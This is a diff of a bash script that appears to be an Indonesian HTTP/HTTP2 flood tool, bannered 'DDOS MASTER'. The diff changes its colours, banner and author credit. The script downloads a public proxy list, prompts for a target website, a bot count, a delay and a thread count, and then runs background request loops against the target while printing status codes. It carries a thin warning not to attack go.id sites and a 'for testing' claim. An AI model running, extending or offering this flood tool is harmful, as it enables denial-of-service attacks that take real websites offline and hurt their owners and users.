@@ -1,23 +1,36 @@
 #!/bin/bash
-## naix0x create the game
+## Devoloper By Ro0T_N3T
 
 # Check if figlet is installed, if not, install it
 if ! command -v figlet &> /dev/null; then
     echo "Installing figlet..."
-    sudo apt-get update
-    sudo apt-get install -y figlet
+   # sudo apt-get update
+    apt install -y figlet
 fi
 
 # Check if bc is installed, if not, install it
-if ! command -v bc &> /dev/null; then
-    echo "Installing bc..."
-    sudo apt-get update
-    sudo apt-get install -y bc
-fi
+#if ! command -v bc &> /dev/null; then
+  #  echo "Installing bc..."
+  #  sudo apt-get update
+  #  sudo apt-get install -y bc
+#fi
 rm proxy.txt
+echo "Installing proxy..."
+sleep 1
 curl https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt -o proxy.txt
+echo "Installing proxy sukses.."
+sleep 2
 clear
-
+cyan='\e[0;36m'
+green='\e[0;34m'
+okegreen='\033[92m'
+lightgreen='\e[1;32m'
+white='\e[1;37m'
+red='\e[1;31m'
+yellow='\e[0;33m'
+BlueF='\e[1;34m' #Biru
+RESET="\033[00m" #normal
+orange='\e[38;5;166m'
 ip=""
 max=""
 delay=""
@@ -35,11 +48,11 @@ color_echo() {
 
 # Function to ask the user whether to use a proxy or not
 ask_use_proxy() {
-    read -p "Apakah Anda ingin menggunakan proxy? (y/n): " use_proxy_choice
+    read -p "          Apakah Anda ingin menggunakan proxy? (y/n): " use_proxy_choice
     case $use_proxy_choice in
         [yY]) use_proxy=true;;
         [nN]) use_proxy=false;;
-        *) color_echo "Pilihan tidak valid. Defaultnya adalah tidak menggunakan proxy." && use_proxy=false;;
+        *) color_echo "          Pilihan tidak valid. Defaultnya adalah tidak menggunakan proxy." && use_proxy=false;;
     esac
 }
 
@@ -49,13 +62,13 @@ set_proxy() {
         if [ -f "$proxy_file" ]; then
             proxies=($(cat "$proxy_file"))
             if [ ${#proxies[@]} -eq 0 ]; then
-                color_echo "Tidak ada proxy yang tersedia. Berjalan tanpa proxy."
+                color_echo "          Tidak ada proxy yang tersedia. Berjalan tanpa proxy."
                 use_proxy=false
             else
                 proxy=$(shuf -n 1 "$proxy_file")
             fi
         else
-            color_echo "File proksi tidak ditemukan. Berjalan tanpa proxy."
+            color_echo "          File proksi tidak ditemukan. Berjalan tanpa proxy."
             use_proxy=false
         fi
     fi
@@ -65,16 +78,16 @@ set_proxy() {
 color_echo "$(figlet -f slant " http - flood ")"
 
 # Display protocol selection table
-color_echo "+----+------------+"
-color_echo "| No | Protocol   | ⚠️ WARMING ⚠️"
-color_echo "+----+------------+"
-color_echo "| 1  | HTTP       | 📢 Jangan Serang Situs go.id"
-color_echo "| 2  | HTTP/2     | 📢 Tools ini dibuat untuk Testing!!!"
-color_echo "+----+------------+"
+color_echo "          +----+------------+"
+color_echo "          $red| No |$red Protocol   |$yellow ⚠️ WARMING ⚠️"
+color_echo "          +----+------------+"
+color_echo "          | 1  | HTTP       |$green 📢 Jangan Serang Situs go.id"
+color_echo "          | 2  | HTTP/2     |$green 📢 Tools ini dibuat untuk Testing!!!"
+color_echo "          +----+------------+"
 echo ""
-echo -e "\033[0m Version 8.7 | Dev By Ro0TN3T"
+echo -e $cyan"          Version 8.7 | Dev By $yellow Ro0T_N3T"
 echo ""
-read -p "Masukkan nomor yang sesuai dengan pilihan Anda: " protocol_choice
+read -p "          Masukkan nomor yang sesuai dengan pilihan Anda: " protocol_choice
 
 # Set protocol based on user choice
 case $protocol_choice in
@@ -82,16 +95,26 @@ case $protocol_choice in
     2) protocol="https";;
     *) color_echo "Pilihan tidak valid. Defaultnya ke HTTP." && protocol="http";;
 esac
-
+echo " "
+echo -e $red
+echo " "
+echo " ddddddd     dddddddd      oo00000000        ssssss                  "
+echo " dd     d    dd       d    oo      00      ss                  \     "
+echo " dd      d   dd        d   oo      00      ss        -----------\    "
+echo " dd       d  dd         d  oo      00       sss                  \   "
+echo " dd       d  dd         d  oo      00           ss   ----------- /   "
+echo " dd      d   dd        d   oo      00             ss            /    "
+echo " dd     d    dd       d    oo      oo            ss            /     "
+echo " ddddddd     ddddddddd     oooooooooo      ssssss    MASTER          "
 # Prompt for attack details
-color_echo "Masukkan Detail Serangan untuk $protocol"
-color_echo "---------------------------------"
-echo "ex : target.com or ip address"
-echo "---------------------------------"
-read -p "Target Web : " ip
-read -p "Jumlah Bot: " max
-read -p "Penundaan (milidetik, minimum 10 ms) : " delay
-read -p "Jumlah Thread " threads
+color_echo "          Masukkan Detail Serangan untuk $protocol"
+color_echo "          ---------------------------------"
+echo "           ex : target.com or ip address"
+echo "          ---------------------------------"
+read -p "          Target Web : " ip
+read -p "          Jumlah Bot : " max
+read -p "          Penundaan (milidetik, minimum 10 ms) : " delay
+read -p "          Jumlah Thread minimum (1) Max (100) : " threads
 echo ""
 
 # Ensure minimum delay is 10 milliseconds
@@ -179,9 +202,9 @@ send_traffic_http() {
         http_description=$(get_status_description "$http_code")
         color_echo "[$i:$j] HTTP Status Code: $http_code - $http_description"
       done) &
-      #"$(echo "$delay/1000" | bc -l)"
+    # sleep "$(echo "$delay/1000" | bc -l)"
       sleep 0.1
-      echo -e '\033[35m  Website Is Down Target : '"$ip"
+      echo -e '\033[35m  Website Is  Target : '"$ip"
     done
 }
 
@@ -211,7 +234,7 @@ send_traffic_http2() {
       done) &
      # sleep "$(echo "$delay/1000" | bc -l)"
      sleep 0.1
-      echo -e '\033[35m  Website Is Down Target : '"$ip"
+      echo -e '\033[35m  Website Is Target : '"$ip"
     done
 }
 
